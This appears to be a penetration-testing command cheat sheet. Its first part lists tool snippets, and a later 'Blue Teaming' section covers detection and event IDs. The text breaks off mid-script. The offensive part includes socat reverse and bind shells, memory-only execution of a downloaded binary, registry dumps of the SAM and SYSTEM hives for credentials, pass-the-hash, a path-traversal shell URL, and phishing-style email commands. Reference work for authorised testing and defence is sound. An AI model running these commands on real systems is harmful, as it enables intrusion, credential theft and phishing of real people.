### SyntaxError: invalid non-printable character U+200B

```c
$ sed -i 's/\xe2\x80\x8b//g'
$ sed 's/\xe2\x80\x8b//g' <FILE> > <FILE>
```

### Shell Code Conversion

```c
$ python -c 'print "\x41"'
```

### Testing Web Sockets

```c
$ python3 -m websockets ws://<DOMAIN>
```

### Fixing Crypto Error

```c
$ pip3 install pycryptodome
```

### Running Binaries without touching Disk

```c
$ python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("<TEXT>"); os.write(fd, http://d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p, "-h"],{})'
```

## Python TOTP

```c
$ sudo pip3 install pyotp
$ python3 -c 'import pyotp; totp = pyotp.TOTP("orxxi4c7orxwwzlo"); print(totp.now())'
```

## rdesktop

```c
$ rdesktop <RHOST>
```

## readpst

```c
$ readpst <FILE>
$ readpst -rS <FILE>
```

## Redirects

```c
stdin     // value 0
stdout    // value 1
stderr    // value 2
```

```c
< redirects stdin
> redirects stdout
2> redirects stderr
2>&1 redirects stderr to stdout
```

`terminal > stdin (0) program > stdout (1) > $ <COMMAND> > <FILE>.txt`
`terminal > stdin (0) program > stderr (2) > $ <COMMAND> 2> <FILE>.txt`

`sudo` doesn't affect redirects.

```c
$ sudo echo <COMMAND> > /etc/<FOOBAR>    # does not work
$ echo <COMMAND> | sudo tee /etc/<FOOBAR>    # does work
```

### Examples

```c
$ wc < <FILE>.txt                // redirect stdin
$ cat <FILE>.txt | wc            // redirect stdin
$ <COMMAND> > <FILE.txt > 2>&1    // redirect stderr to stdout
$ <COMMAND> > /dev/null           // OS ignores all writes to /dev/null
```

## regedit

### Dumping Credentials

```c
PS C:\Users\user\Downloads> reg save hklm\system system
PS C:\Users\user\Downloads> reg save hklm\sam sam
```

```c
C:\> reg.exe save hklm\sam c:\temp\sam.save
C:\> reg.exe save hklm\security c:\temp\security.save
C:\> reg.exe save hklm\system c:\temp\system.save
```

## rev

```c
$ echo "foobar" | rev
```

## Reverse SSH

```c
$ git clone https://github.com/NHAS/reverse_ssh
$ cd reverse_ssh
$ make
$ cd bin/
$ cat ~/.ssh/id_rsa.pub > authorized_keys
$ ./server 0.0.0.0:3232
```

```c
$ ./client -d <LHOST>:3232
```

```c
$ ssh <LHOST> -p 3232 ls -t
```

```c
$ ssh -J <LHOST>:3232 1fe03478b2775060f6643adaac57a0f5b99989b3
```

## rlwrap

```c
$ rlwrap nc -lnvp <LPORT>
```

## rpm2cpio

### Unpacking .rpm-Files

```c
$ rpm2cpio <FILE>.rpm | cpio -idmv
```

## rsh

```c
$ rsh <RHOST> <COMMAND>
$ rsh -l <USERNAME> <RHOST>
```

## rsync

### Connect

```c
$ nc -vn remote_ip 873
```

```c
$ #list
```

### Download

```c
$ rsync -av rsync://<RHOST>/<FILE>/<REMOTE_DIRECTORY> <LOCAL_DIRECTORY>
```

## RunAs

```c
C:\> runas /user:"<USERNAME>" cmd.exe
```

## sendemail

```c
sendemail -f foobar@<DOMAIN> -t nico@<DOMAIN> -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.10.10.77 -v
```

## seq

### Create a List of Numbers

```c
$ seq 0 100
```

## SetUID Bit

```c
$ chmod 4755 <FILE>
```

## sftp

```c
$ ftps -P <RPORT> ftpuser@<RHOST>
$ sshfs -p <RPORT> ftpuser@<RHOST>: /mnt/<FOLDER>
```

## showmount

```c
$ /usr/sbin/showmount -e <RHOST>
$ sudo showmount -e <RHOST>

$ chown root:root sid-shell; chmod +s sid-shell
```

## SIGSEGV

```c
$ sleep 50 &
$ killall -SIGSEGV sleep
```

## simpleproxy

```c
$ simpleproxy -L <LPORT> -R <RHOST>:<RPORT>
```

## SMB

```c
$ smb:\> allinfo <FILE>
```

## smbcacls

```c
$ smcbcacls -N "//<RHOST>/<SHARE>" ''
```

```c
$ for i in $(ls); do echo $i; smbcacls -N "//<RHOST>/<SHARE>" '$i';done >&1 > <FILE>
```

## smbclient

```c
$ sudo apt-get install libguestfs-tools
```

### Common Commands

```c
$ smbclient -L \\<RHOST>\ -N
$ smbclient -L //<RHOST>/ -N
$ smbclient -L ////<RHOST>/ -N
$ smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
$ smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
$ smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
$ smbclient "\\\\<RHOST>\<SHARE>"
$ smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
$ smbclient --no-pass //<RHOST>/<SHARE>
$ mount.cifs //<RHOST>/<SHARE> /mnt/remote
$ guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
```

### Usage

```c
$ smb: \> get <filename>
```

### Anonymous Login

```c
$ smbclient //<RHOST>/<FOLDER> -N
$ smbclient \\\\<RHOST>/<FOLDER> -N
```

### Download multiple Files at once

```c
$ smbclient '\\<RHOST>\<SHARE>'
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> cd 'PATH\TO\REMOTE\DIRECTORY\'
smb: \> lcd '/PATH/TO/LOCAL/DIRECTORY'
smb: \> mget *
```

### Upload multiple Files at once

```c
$ smbclient '\\<RHOST>\<SHARE>'
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mput *
```

### One-liner

```c
$ smbclient '\\<RHOST>\<SHARE>' -N -c 'prompt OFF;recurse ON;cd 'PATH\TO\REMOTE\DIRECTORY';lcd '/PATH/TO/LOCAL/DIRECTORY';mget *'`
```

## smbget

```c
$ smbget -R smb://<RHOST>/<folder>
$ smbget -rR smb://<RHOST>/PATH/TO/SHARE/ -U <USERNAME>
```

## smbmap

```c
$ smbmap -H <RHOST>
$ smbmap -H <RHOST> -R
$ smbmap -u <USERNAME> -p <PASSWORD> -H <RHOST>
```

## smbpasswd

```c
$ smbpasswd -r <RHOST> -U <USERNAME>
```

## socat

### Local Proxy

```c
$ socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
```

### Reverse Shell

#### Option 1

##### Local System

```c
$ socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
```

##### Remote System

```c
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```

#### Option 2

##### Local System

```c
$ socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
```

##### Remote System

```c
$ socat tcp-listen:9002,reuseaddr,fork tcp:192.168.122.228:5968 &
```

### UDP Shell

#### Local System

```c
$ socat file:`tty`,echo=0,raw udp-listen:<LPORT>
```

### Bind Shell

```c
$ sudo socat OPENSSL-LISTEN:443,cert=<FILE>.pem,verify=0,fork EXEC:/bin/bash
$ socat - OPENSSL:<RHOST>:443,verify=0
```

### Send File

```c
$ sudo socat TCP4-LISTEN:443,fork file:<FILE>
$ socat TCP4:<LHOST>:443 file:<FILE>, create    // openssl req -newkey rsa:2048 -nodes -keyout <FILE>.key -x509 -out <FILE>.crt; cat <FILE>.key <FILE>.crt \> <FILE>.pem
```

### Encrypted Connection

#### Create Certificate

```c
$ openssl req --newkey rsa:2048 -nodes -keyout <FILE>.key -x509 -days 362 -out <FILE>.crt
```

#### Create .pem File

```c
$ cat <FILE>.key <FILE>.crt > <FILE>.pem
```

#### Listener

```c
$ socat OPENSSL-LISTEN:<LPORT>,cert=<FILE>.pem,verify=0 -
```

or

```c
socat OPENSSL-LISTEN:<LPORT> FILE:tty,raw,echo=0,cert=<FILE>.pem,verify=0
```

#### Connect

```c
$ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
```

or

```c
$ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## Spaces Cleanup

```c
$ sed -i -e ‘s/\r$//’ <SCRIPT>
```

The tool `dos2unix` does the job too.

## squid

```c
$ cat /var/spool/squid/netdb.state
```

## squidclient

```c
$ sudo apt-get install squidclient
```

```c
$ squidclient -h <RHOST> -w '<PASSWORD>' mgr:fqdncache
```

## SSH

### Code Execution

```c
$ ssh <USERNAME>@<RHOST> "<COMMAND>"
```

### Force Password Authentication

```c
$ ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no <USERNAME>@<RHOST>
```

### Outdated Ciphers

```c
$ ssh <USERNAME>@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
```

### SSH Shell

#### Command

```c
~C
```

##### Example

```c
SSH>
```

### Port Forward Listener

```c
$ ssh -L <LPORT>:127.0.0.1:<RPORT> <USERNAME>@<RHOST>
$ ssh -N -L <LPORT>:127.0.0.1:<RPORT> <USERNAME>@<RHOST>
```

### Reverse SSH Tunnel

```c
$ ssh -L 80:<LHOST>:80 <RHOST>
$ ssh -L 80:localhost:80 <RHOST>
```

### Dynamic Port Forwarding

```c
$ ssh -D 1080 <USERNAME>@<RHOST>
$ ssh -NfD 1080 <USERNAME>@<RHOST>
$ ssh -N -D 0.0.0.0:9999 <USERNAME>@<RHOST>
```

Then use Proxychains with `socks5` with port `1080/TCP` or `9999/TCP` on localhost.

### Remote Port Forwarding

```c
$ ssh -R 8080:<LHOST>:80 <RHOST>
$ ssh -N -R 127.0.0.1:<LPORT>:<RHOST>:<RPORT> <USERNAME>@<RHOST>
```

### Remote Dynamic Port Forwarding

```c
$ ssh -N -R <LHOST> <USERNAME>@<RHOST>
```

## sshpass

```c
$ sshpass -p "<PASSWORD>" ssh <USERNAME>@<RHOST>
$ sshpass -p "<PASSWORD>" ssh <USERNAME>@<RHOST> "<COMMAND>"
```

## stat

```c
$ stat <LOCAL_DIRECTORY>
```

### strace

```c
$ strace -v -f -e execve /PATH/TO/BINARY 2>&1 | grep <NAME>
```

## stty

### Set Size for Reverse Shell

```c
$ stty -a
$ stty rows <NUMBER>
$ stty cols <NUMBER>
```

### Limit Line Output

```c
$ stty rows 2
```

## strings

### Show clean Output

```c
$ strings -n 8 <FILE>
```

## SVN

```c
$ svn checkout svn://<RHOST>/
$ svn diff -r 2
```

## swaks

> https://jetmore.org/john/code/swaks/

> https://github.com/jetmore/swaks

```c
$ sudo nv -lnvp 80
$ while read mail; do swaks --to $mail --from <EMAIL> --header "Subject: Test / Test" --body "goto http://<LHOST>/" --server <RHOST>; done < mail.txt
```

## systemd

### Networking Commands

```c
$ ip -c -br address show
$ ip -c -br address show <INTERFACE>
```

### Service Commands

```c
$ systemd-analyze security --no-pager systemd-logind.service
```

## tee

```c
$ cat <FILE> | tee output.txt    // displays the output and also writes it down into a file
```

## Telnet

```c
GET / HTTP/1.1
Host: telnet
Enter
```

## tftp

```c
$ tftp <RHOST>
$ status
$ get
$ put
```

### Working Directory

```c
http://<RHOST>/?file=../../../../var/lib/tftpboot/shell.php
```

## timedatectl

```c
$ timedatectl status
$ sudo dpkg-reconfigure tzdata
```

## Time and Date

### Stop virtualbox-guest-utils to stop syncing Time

```c
$ sudo /etc/init.d/virtualbox-guest-utils stop
```

### Stop systemd-timesyncd to sync Time manually

```c
$ sudo systemctl stop systemd-timesyncd
```

### Options to set the Date and Time

```c
$ sudo net time -c <RHOST>
$ sudo net time set -S <RHOST>
$ sudo net time \\<RHOST> /set /y
$ sudo ntpdate <RHOST>
$ sudo ntpdate -s <RHOST>
$ sudo ntpdate -b -u <RHOST>
$ sudo timedatectl set-timezone UTC
$ sudo timedatectl list-timezones
$ sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
$ sudo timedatectl set-time 15:58:30
$ sudo timedatectl set-time '2015-11-20 16:14:50'
$ sudo timedatectl set-local-rtc 1
```

### Disable automatic Sync

```c
$ sudo systemctl disable --now chronyd
```

### Get the Server Time

```c
$ sudo nmap -sU -p 123 --script ntp-info <RHOST>
```

### Sync Command

```c
$ sudo date -s "$(curl -si http://<RHOST> | grep "Date: "| sed s/"Date: "//g)"
Sun 02 Jan 2022 01:37:00 PM UTC
```

### Keep in Sync with a Server

```c
$ while [ 1 ]; do sudo ntpdate <RHOST>;done
```

### Hash based on md5 and time

```c
$ php -a
Interactive mode enabled

php > while (true){echo date("D M j G:i:s T Y"); echo " = " ; echo md5('$file_hash' . time());echo "\n";sleep(1);}
```

## tmux

### Options

```c
:set mouse on
:setw -g mode-keys vi
:set synchronize-panes
```

### List Sessions

```c
$ tmux list-sessions
```

### Attach to Session

```c
$ tmux attach-session -t 0
```

### Window List

```c
ctrl b + w
```

### Copy and Paste

```c
ctrl b + [
space
alt w
ctrl b + ]
```

### Search

```c
ctrl b + [    // enter copy
ctrl + s      // enter search from copy mode
ctrl + r      // search reverse direction
```

### Logging

```c
ctrl b
shift + P    // start / stop
```

### Save Output

```c
ctrl b + :
capture-pane -S -
ctrl b + :
save-buffer <FILE>.txt
```

## TTL

A TTL of `ttl=64` or less, indicates that it is possibly a Linux system.
Windows systems usually use `128`.

## utf8cleaner

```c
$ pip3 install utf8cleaner
$ utf8cleaner --input <FILE>
```

## VDH

### Mounting .vdh-Files

```c
$ sudo mount -t cifs //<RHOST>/<FOLDER> /mnt/<LOCAL_DIRECTORY>/ -o user=null
$ sudo apt-get install libguestfs-tools
$ sudo guestmount --add /PATH/TO/MOUNTPOINT/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/
```

## vim

```c
$ :w !sudo tee %   // write to file without opening it
$ :w <FILE>        // save output into a file
$ :sh              // put vim into the background and opens a new shell
$ :%!sort -u       // use a command and pipe the output back to vim
```

### Spawning a Shell

Especially in hardened environments where basic commands like `ls`, `dir` etc. not work.

```c
:set shell=/bin/sh
:shell
```

## VirtualBox

### Fix Copy-and-Paste Issue

```c
$ sudo pkill VBoxClient && VBoxClient --clipboard
```

### Fix Missing Kernel Driver Error (rc=1908)

```c
$ sudo apt-get remove virtualbox-dkms
$ sudo apt-get remove --purge virtualbox-dkms
$ sudo apt-get install -y linux-headers-amd64 linux-image-amd64
$ sudo apt-get install -y virtualbox-dkms
```

## virtualenv

### Linux

```c
$ sudo apt-get install virtualenv
$ virtualenv -p python2.7 venv
$ . venv/bin/activate
```

### Microsoft Windows

```c
C:\Windows\System32> python.exe -m pip install virtualenv
C:\Windows\System32> python.exe -m virtualenv venv
C:\Windows\System32> venv\Scripts\activate
```

## wget

```c
$ wget -r --no-parent <RHOST>/<DIRECTORY>              // recursive download of all files and structure
$ wget -m ftp://anonymous:anonymous@<RHOST>            // ftp download
$ wget -N -r -l inf <RHOST>/PATH/TO/REPOSITORY/.git    // reverse download of a git repository
```

## while loop

```c
while read -r line;
do
   echo "$line" ;
done < /PATH/TO/FILE/<FILE>
```

## Writeable Directories

```c
/dev/shm
/tmp
```

## Windows Subsystem for Linux (WSL)

### Open Optional Features Window

```c
Win+r
optionalfeatures
Enter
```

### Select and install Windows Subsystem for Linux

```c
Windows Subsystem for Linux
```

### Set WSL Default Version

```c
PS C:\> wsl --set-default-version 1
```

Open Microsoft App Store and get Kali/Ubuntu.

## Wine

### Winetricks .Net Setup

```c
$ sudo apt-get install -y mono-complete wine winetricks
```

```c
$ winetricks dotnet48
```

## X

```c
$ xdpyinfo -display :0
$ xwininfo -root -tree -display :0
$ XAUTHORITY=/home/<USERNAME>/.Xauthority xdpyinfo -display :0
$ XAUTHORITY=/home/<USERNAME>/.Xauthority xwd -root -screen -silent -display :0 > /tmp/screenshot.xwd
```

## xfreerdp

```c
$ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +clipboard
```

### Resolution Handling

```c
$ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /h:1010 /w:1920 +clipboard
$ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
```

### Folder Sharing

```c
$ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore /drive:/PATH/TO/FOLDER,shared
```

### Pass-the-Hash

```c
$ xfreerdp /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /v:<RHOST> /dynamic-resolution +clipboard
```

### Disable TLS Security Level

```c
$ xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
```

### Fix Error Message transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED

#### Example

```c
[16:46:07:882] [87307:87308] [ERROR][com.freerdp.core] - transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]
```

#### Fix

Add `/tls-seclevel:0 /timeout:80000` to the command.

```c
FIX: $ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<RHOST> /tls-seclevel:0 /timeout:80000 +clipboard
```

## Zip

### Extracing Excel Sheets

```c
$ unzip <FILE>.xslx
```

### Creating Excel Sheets

```c
$ zip -r <FILE>.xls
```

### Creating Password Protected .zip Files

```c
$ zip -re <FILE>.zip <FOLDER>/
```

## zipgrep

```c
$ zipgrep password <FILE>.jar
```






# Blue Teaming

- [Resources](#resources)

## Table of Contents

- [Advanced Threat Analytics](#advanced-threat-analytics)
- [API Security Tasks](#api-security-tasks)
- [Atomic Red Team](#atomic-red-team)
- [Event Log Analysis](#event-log-analysis)
- [Device Guard](#devoice-guard)
- [General Configuration](#general-configuration)
- [LAPS](#laps)
- [Layered Architecture](#layered-architecture)
- [Mitigate Kerberoast](#mitigate-kerberoast)
- [Mitigate Skeleton Key](#mitigate-skeleton-key)
- [Mitigate Trust Attack](#mitigate-trust-attack)
- [Privileged Administrative Workstations](#privileged-administrative-workstations)
- [Protected Users Group](#protected-users-group)
- [Red Forest](#red-forest)
- [Sniffing SSH Sessions](#sniffing-ssh-sessions)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| APT Simulator | A toolset to make a system look as if it was the victim of an APT attack | https://github.com/NextronSystems/APTSimulator |
| Azure Hunter | A Cloud Forensics Powershell module to run threat hunting playbooks on data from Azure and O365. | https://github.com/darkquasar/AzureHunter |
| BlueHound | BlueHound is an open-source tool that helps blue teams pinpoint the security issues that actually matter. | https://github.com/zeronetworks/BlueHound |
| Blue Team Notes | You didn't think I'd go and leave the blue team out, right? | https://github.com/Purp1eW0lf/Blue-Team-Notes |
| C2IntelFeeds | Automatically created C2 Feeds | https://github.com/drb-ra/C2IntelFeeds |
| Canary Tokens | Generate canary tokens | https://canarytokens.org/generate |
| CrowdSec | Open-source and participative IPS able to analyze visitor behavior & provide an adapted response to all kinds of attacks. | https://github.com/crowdsecurity/crowdsec |
| CyberDefender | A blue team training platform. | https://cyberdefenders.org |
| Cyber Threat Intelligence | Real-Time Threat Monitoring. | https://start.me/p/wMrA5z/cyber-threat-intelligence?s=09 |
| Fenrir | Simple Bash IOC Scanner | https://github.com/Neo23x0/Fenrir |
| Forest Druid | Stop chasing AD attack paths. Focus on your Tier 0 perimeter. | https://www.purple-knight.com/forest-druid |
| GitMonitor | One way to continuously monitor sensitive information that could be exposed on Github. | https://github.com/Talkaboutcybersecurity/GitMonitor |
| HoneyCreds | HoneyCreds network credential injection to detect responder and other network poisoners. | https://github.com/Ben0xA/HoneyCreds |
| Laurel | Transform Linux Audit logs for SIEM usage | https://github.com/threathunters-io/laurel |
| Loki | Loki - Simple IOC and Incident Response Scanner | https://github.com/Neo23x0/Loki |
| Monkey365 | Monkey365 provides a tool for security consultants to easily conduct not only Microsoft 365, but also Azure subscriptions and Azure Active Directory security configuration reviews. | https://github.com/silverhack/monkey365 |
| packetSifter | PacketSifter is a tool/script that is designed to aid analysts in sifting through a packet capture (pcap) to find noteworthy traffic. Packetsifter accepts a pcap as an argument and outputs several files. | https://github.com/packetsifter/packetsifterTool |
| PersistenceSniper | Powershell script that can be used by Blue Teams, Incident Responders and System Administrators to hunt persistences implanted in Windows machines. | https://github.com/last-byte/PersistenceSniper |
| PlumHound | Bloodhound for Blue and Purple Teams | https://github.com/PlumHound/PlumHound |
| Purple Knight | #1 Active Directory security assessment community tool | https://www.purple-knight.com |
| Ransomware Simulator | Ransomware simulator written in Golang | https://github.com/NextronSystems/ransomware-simulator |
| SIGMA | Generic Signature Format for SIEM Systems | https://github.com/SigmaHQ/sigma |
| Simple Email Reputation | EmailRep Alpha Risk API | https://emailrep.io |
| Slack Watchman | Slack enumeration and exposed secrets detection tool | https://github.com/PaperMtn/slack-watchman |
| sshgit | Ah shhgit! Find secrets in your code. Secrets detection for your GitHub, GitLab and Bitbucket repositories. | https://github.com/eth0izzle/shhgit |
| STACS | Static Token And Credential Scanner | https://github.com/stacscan/stacs |
| TheHive | TheHive: a Scalable, Open Source and Free Security Incident Response Platform | https://github.com/TheHive-Project/TheHive |
| ThePhish | ThePhish: an automated phishing email analysis tool | https://github.com/emalderson/ThePhish |
| Thinkst Canary | Canary Tokens | https://canary.tools |
| Wazuh | Wazuh - The Open Source Security Platform. Unified XDR and SIEM protection for endpoints and cloud workloads. | https://github.com/wazuh/wazuh |
| YARA | The pattern matching swiss knife | https://github.com/VirusTotal/yara |

## Advanced Threat Analytics

- Traffic for DCs is mirrored to ATA Sensors (or installed on dc as service), activity profile is build
- Collects 4776 (credential validation of a user) to detect replay attacks, detects behavioral anomalies
- Detects: account enumeration, netsession enumeration, Brute Force, exposed cleartext credentials, honey tokens, unusual protocols, credential attacks (pth,ptt,ticket replay)
- Will NOT detect non existent users for golden ticket
- Detects DCSync, but not DCShadow

## API Security Tasks

Shoutout to `Tara Janca` from `We Hack Purple`!

1. List all APIs (create an inventory)
2. Put them behind a gateway
3. Throttling and resource quotas
4. Logging, monitoring and alerting
5. Block all unused HTTP methods
6. Use a service mesh for communication management
7. Implement standards for your organisation / API definition documents
8. Strict Linting
9. Authenticate THEN authorize
10. Avoid verbose error messages
11. Decommission old or unused versions of APIs
12. Do all the same secure coding practices you normally do; input validation using approved lists, parameterized queries, bounds checking, etc.

## Atomic Red Team

> https://github.com/redcanaryco/atomic-red-team

> https://github.com/redcanaryco/invoke-atomicredteam

### Invoke-AtomicRedTeam

```c
PC C:\> PowerShell -ExecutionPolicy bypass
PC C:\> Import-Module "C:\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
PC C:\> $PSDefaultParameterValues = @{"Invoke-AtomicTest:PathToAtomicsFolder"="C:\AtomicRedTeam\atomics"}
PC C:\> help Invoke-AtomicTest
PC C:\> Invoke-AtomicTest T1127 -ShowDetailsBrief
PC C:\> Invoke-AtomicTest T1127 -ShowDetails
PC C:\> Invoke-AtomicTest T1127 -CheckPrereqs
PC C:\> Invoke-AtomicTest T1127 -GetPrereqs
PC C:\> Invoke-AtomicTest T1053.005 -ShowDetailsBrief
PC C:\> Invoke-AtomicTest T1053.005 -TestNumbers 1,2
PC C:\> schtasks /tn T1053_005_OnLogon
```

### Emulation

```c
PC C:\> ls C:\AtomicRedTeam\atomics | Where-Object Name -Match "T1566.001|T1203|T1059.003|T1083|T1082|T1016|T1049|T1007|T1087.001"
PC C:\> 'T1566.001','T1059.003','T1083','T1082','T1016','T1049','T1007','T1087.001' | ForEach-Object {echo "Enumerating $_"; Invoke-AtomicTest $_ -ShowDetailsBrief }
PC C:\> 'T1566.001','T1059.003','T1083','T1082','T1016','T1049','T1007','T1087.001' | ForEach-Object {echo "Enumerating $_"; Invoke-AtomicTest $_ -CheckPrereqs }
PC C:\> Invoke-AtomicTest T1059.003-3
```

### Emulation to Detection

```c
PC C:\> Invoke-AtomicTest T1547.001 -CheckPrereqs
PC C:\> Invoke-AtomicTest T1547.001 -TestNumbers 2
```

### Customising

```c
PC C:\> cat T1136.001/T1136.001.yaml
PC C:\> Invoke-AtomicTest T1136.001 -TestNumbers 3
PC C:\> net user
PC C:\> Invoke-AtomicTest T1136.001 -TestNumbers 3 -PromptForInputArgs
PC C:\> net user
PC C:\> Invoke-AtomicTest T1136.001 -TestNumbers 3 -PromptForInputArgs -Cleanup
```

### Creating new Atomic Tests by using the GUI

```c
PC C:\> Start-AtomicGui
```

> http://localhost:8487/home

## Event Log Analysis

### Windows Event IDs

| Event ID | Description | Importance for Defenders | Example MITRA ATT&CK Technique |
| --- | --- | --- | --- |
| 1102 | Security Log cleared | May indicate an attacker is attempting to cover their tracks by clearing the security log (e.g., security log cleared after an unauthorized admin logon) | T1070 - Indicator Removal on Host |
| 4624 | Successful account Logon | Helps identify unauthorized or suspicious logon attempts, and track user activity on the network (e.g., logons during off-hours from unusual hosts) | T1078 - Valid Accounts |
| 4625 | Failed account Logon | Indicates potential brute-force attacks or unauthorized attempts to access a system (e.g., multiple failed logons from a single source in a short time) | T1110 - Brute Force |
| 4648 | Logon attempt with explicit credentials | May suggest credential theft or improper use of accounts (e.g., an attacker creates a new token for an account after compromising cleartext credentials) | T1134 - Access Token Manipulation |
| 4662 | An operation was performed on an object | Helps track access to critical objects in Active Directory, which could indicate unauthorized activity (e.g., an attacker performs a DCSync attack by performing replication from an unusual host) | T1003 - OS Credential Dumping |
| 4663 | Access to an object was requested | Monitors attempts to perform specific actions on sensitive objects like files, processes, and registry keys, which could indicate unauthorized access (e.g., an attacker attempts to read a file or folder which has been specifically configured for auditing) | T1530 - Data from Local System |
| 4670 | Permissions on an object were changed | Helps detect potential tampering with sensitive files or unauthorized privilege escalation (e.g., a low-privileged user modifying permissions on a sensitive file to gain access) | T1222 - File Permissions Modification |
| 4672 | Administrator privileges assigned to a new Logon | Helps detect privilege escalation and unauthorized admin account usage (e.g., a standard user suddenly granted admin rights without a change request) | T1078 - Valid Accounts |
| 4698 | A scheduled task was created | Helps detect malicious scheduled task creation and could indicate persistence, privilege escalation, or lateral movement (e.g., an attacker creates a scheduled task that runs a beacon periodically) | T1053 - Scheduled Task/Job |
| 4720 | New user account created | Monitors for unauthorized account creation or potential insider threats (e.g., a new account created outside of normal business hours without HR approval) | T1136 - Create Account |
| 4724 | An attempt was made to reset an account's password | Monitors for unauthorized password resets, which could indicate account takeover (e.g., an attacker resetting the password of a high-privileged account) | T1098 - Account Manipulation |
| 4728 | Member added to a security-enabled global group | Tracks changes to important security groups, which could indicate unauthorized privilege escalation (e.g., an attacker adds a user to the "Domain Admins" group) | T1098 - Account Manipulation |
| 4732 | Member added to a security-enabled Local group | Monitors changes to local security groups, which could suggest unauthorized access or privilege escalation (e.g., an attacker adds a user to the "Administrators" local group) | T1098 - Account Manipulation |
| 4768 | A Kerberos authentication ticket was requested (TGT Request) | Monitors initial authentication requests to track user logons, and helps identify potential abuse of the Kerberos protocol (e.g., an attacker compromises the NTLM hash of a privileged account and performs an overpass-the-hash attack which requests a TGT from an unusual host) | T1558 - Steal or Forge Kerberos Tickets |
| 4769 | A Kerberos service ticket was requested | Monitors for potential Kerberoasting attacks or other suspicious activities targeting the Kerberos protocol (e.g., a sudden increase in requests for unique services from a single user) | T1558 - Steal or Forge Kerberos Tickets |
| 4776 | The domain controller attempted to validate the credentials | Helps identify failed or successful attempts to validate credentials against the domain controller, which could indicate unauthorized access or suspicious authentication activity (e.g., an unusual number of failed validations from a single IP address) | T1110 - Brute Force |
| 7045 | New service installed | Monitors for potential malicious services being installed, indicating lateral movement or persistence (e.g., a remote access tool installed as a service on multiple machines) | T1543 - Create or Modify System Process |

### Detect ACL Scan

Requires enabled audit policy.

```c
4662: Operation was performed on an object
5136: directory service object was modified
4670: permissions on an object were changed
```

### Detect DACL Abuse

| Event ID | Attack | Description |
| ---| --- | --- |
| 4662, 4738, 5136, 4769 | Set an SPN for the user and perform a kerberoast attack. | Setting a user's SPN results in a 4738, 4662 and 5136 for the target account. A subsequent 4769 captures the kerberoasting event. |
| 4662, 4738, 5136, 4768 | Disable pre-authentication and capture a user's TGT with an AS-REP roast attack. | Disabling pre-authentication results in a 4738 and 5136 for the target account. A subsequent 4768 captures the AS-REP roasting attack. |
| 4662, 5136, 4768 | Perform a shadow credential attack which sets the user object msDS-KeyCredentialLink property. | Setting mDS-KeyCredentialLink results in a 4662 and 5136 for the target account. A subsequent 4768 with pre-authentication type 16 and credential information is generated. |
| 4724, 4738 | Change the user's password | Changing a user's password results in a 4724 and 4738 for the target account. |

### Detect Dsrm

```c
4657: Audit creating/Change of HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehaviour
```

### Detect Golden Ticket

```c
4624: Account Logon
4634: Account Logoff
4672: Admin Logon (should be monitored on the dc)
```

```c
PC C:\> Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 |Format-List -Property *
```

### Detect Kerberoast

```c
4769: A Kerberos ticket as requested, Filter: Name != krbtgt, does not end with $, not machine@domain, Failure code is 0x0 (success), ticket encryption is 0x17 (rc4-hmac)
```

### Detect Malicious SSP

```c
4657: Audit/creation of HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages
```

### Detect Skeleton Key

```c
7045: A Service was installed in the system.
4673: Sensitive Privilege user (requires audit privileges)
4611: Trusted logon process has been registered with the Local Security Authority (requires audit privileges)
```

```c
PC C:\> Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}
```

### Detect hidden Windows Services via Access Control Lists (ACLs)

> https://twitter.com/0gtweet/status/1610545641284927492?s=09

> https://github.com/gtworek/PSBits/blob/master/Services/Get-ServiceDenyACEs.ps1

```c
$keys = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\"

foreach ($key in $keys)
{
    if (Test-Path ($key.pspath+"\Security"))
    {
        $sd = (Get-ItemProperty -Path ($key.pspath+"\Security") -Name "Security" -ErrorAction SilentlyContinue).Security 
        if ($sd -eq $null)
        {
            continue
        }
        $o = New-Object -typename System.Security.AccessControl.FileSecurity
